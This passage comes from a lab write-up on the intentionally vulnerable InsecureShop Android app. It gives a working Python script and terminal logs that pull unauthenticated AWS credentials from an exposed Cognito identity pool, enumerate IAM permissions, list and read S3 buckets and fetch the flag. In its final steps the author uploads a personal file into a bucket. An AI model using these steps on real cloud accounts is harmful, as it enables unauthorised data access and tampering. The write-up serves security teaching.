    identity_id = identity_output['IdentityId']
    print(f"Identity ID: {identity_id}")

    # Step 2: Get Credentials for Identity
    command2 = [
        "aws", "cognito-identity", "get-credentials-for-identity",
        "--identity-id", identity_id,
        "--region", "us-east-1"
    ]
    credentials_output = run_aws_command(command2)

    if credentials_output:
        access_key = credentials_output['Credentials']['AccessKeyId']
        secret_key = credentials_output['Credentials']['SecretKey']
        session_token = credentials_output['Credentials']['SessionToken']
        
        # Step 3: Run the IAM enumeration script and stream output
        command3 = (
            "python3 enumerate-iam.py "
            f"--access-key {access_key} "
            f"--secret-key {secret_key} "
            f"--session-token {session_token} "
            "--region us-east-1"
        )
        # Step 4: Update AWS credentials
        update_aws_credentials(access_key, secret_key,session_token)
        run_and_stream_output(command3)
    else:
        print("Failed to get credentials for identity.")
else:
    print("Failed to get identity.")
```

Let’s explain what is doing:

- getting the Get Identity ID from the command  `aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c --region us-east-1`
- Passing it to the `aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-1ff0-*****-4f0a-43cd212fed35 --region us-east-1` command and get the session and access_key.
- Then, pass all these info to the `enumerate-iam.py`tool and getting the output.

```bash
┌──(root㉿kali)-[/opt/enumerate-iam] 
└─$ python3 exploit.py
2024-09-05 19:38:23,136 - 62112 - [INFO] Starting permission enumeration for access-key-id "ASIARL4ASLIPYKJEFBIL"
2024-09-05 19:38:24,436 - 62112 - [INFO] -- Account ARN : arn:aws:sts::094222047775:assumed-role/Cognito_InsecureshopUnauth_Role/CognitoIdentityCredentials
2024-09-05 19:38:24,436 - 62112 - [INFO] -- Account Id  : 094222047775
2024-09-05 19:38:24,436 - 62112 - [INFO] -- Account Path: assumed-role/Cognito_InsecureshopUnauth_Role/CognitoIdentityCredentials
2024-09-05 19:38:26,286 - 62112 - [INFO] Attempting common-service describe / list brute force.
2024-09-05 19:38:28,041 - 62112 - [INFO] -- s3.list_buckets() worked!
2024-09-05 19:38:33,659 - 62112 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-09-05 19:38:33,950 - 62112 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2024-09-05 19:38:36,357 - 62112 - [ERROR] Remove codedeploy.list_deployment_targets action
2024-09-05 19:38:36,944 - 62112 - [ERROR] Remove codedeploy.get_deployment_target action
2024-09-05 19:38:37,227 - 62112 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
```

- We Noticed that we have access to S3 buckets `s3.list_buckets()`.
- So Our script will add all extracted information to the `/root/.aws/credentials` to create a profile with the name `iam` that will allow us to access the S3 buckets and use these sessions with further AWS commands.

Let’s enumerate which buckets we have access to and then get the content of all of them: 

```bash
┌──(root㉿kali)-[/opt/enumerate-iam] 
└─$ aws s3 ls --profile iam   
2024-07-18 13:05:53 elasticbeanstalk-us-west-2-094222047733
2020-11-15 19:31:10 elasticbeanstalk-us-west-2-094222047775
2022-11-12 20:42:24 geolocation-pocfiles

┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ aws s3 ls s3://elasticbeanstalk-us-west-2-094222047733 --recursive --human-readable --summarize --profile iam

Total Objects: 0
   Total Size: 0 Bytes
                        
┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ aws s3 ls s3://elasticbeanstalk-us-west-2-094222047775 --recursive --human-readable --summarize --profile iam
2022-03-22 19:06:59    1.9 KiB Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io <- writeup here
2023-09-12 05:40:12    9 Bytes hainv15.txt
2023-07-18 20:56:23  279 Bytes pwned.txt

┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ aws s3 ls s3://geolocation-pocfiles --recursive --human-readable --summarize --profile iam
2024-01-29 15:53:40   53 Bytes flag.txt
2022-11-12 20:43:53    1.0 KiB geo.html
2022-11-12 20:43:52  898 Bytes geo.js
```

It appears that `congratulations.txt` doesn’t exist, maybe it has been removed, as the bucket has edit access that can allow any user to remove or add files. But no worries, as we have already followed the same intended solution, we can just get the `flag.txt` file:

```bash
┌──(root㉿kali)-[/opt/enumerate-iam]
└─$  aws s3api get-object --bucket geolocation-pocfiles --key flag.txt flag.txt --profile iam

{
"AcceptRanges": "bytes",
"LastModified": "2024-01-29T13:53:40+00:00",
"ContentLength": 53,
"ETag": "\"42d9cca424a87c68c3bf2cdaf96132a7\"",
"VersionId": "a7nrRagqb8XxKXcIo6uCku0JFE7J9i9U",
"ContentType": "text/plain",
"ServerSideEncryption": "AES256",
"Metadata": {}
}

┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ cat flag.txt
FLAG{dwaidiwadnaidnaubuybfreijjjjjjjinfniernniwnfin}                        
```

I have also added a file to the bucket.

```bash
──(root㉿kali)-[/opt/enumerate-iam]
└─$ cat ItsFading.txt 
X: @ItsFadinG_
LinkedIn: muhammadadel14

┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ aws s3api put-object --bucket elasticbeanstalk-us-west-2-094222047775  --key ItsFading.txt --body ItsFading.txt --profile iam
{
    "ETag": "\"fef1f3f060abea9b61991ad85c07442d\"",
    "ServerSideEncryption": "AES256"
}
                                                                                          
┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ aws s3 ls s3://elasticbeanstalk-us-west-2-094222047775 --recursive --human-readable --summarize --profile iam                
2024-09-05 20:41:45   39 Bytes ItsFading.txt
2022-03-22 19:06:59    1.9 KiB Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io <- writeup here
2023-09-12 05:40:12    9 Bytes hainv15.txt
2023-07-18 20:56:23  279 Bytes pwned.txt

Total Objects: 4
   Total Size: 2.2 KiB
```

Follow me there, and don’t delete my file ::)

## **Conclusion**

The InsecureShop app offer a deep dive into Android app security, helping to strengthen understanding of both common vulnerabilities and advanced exploitation techniques. I am eager to hear your thoughts and feedback. Any insights or suggestions for improvement are greatly appreciated! Stay Safe and Keep Hacking!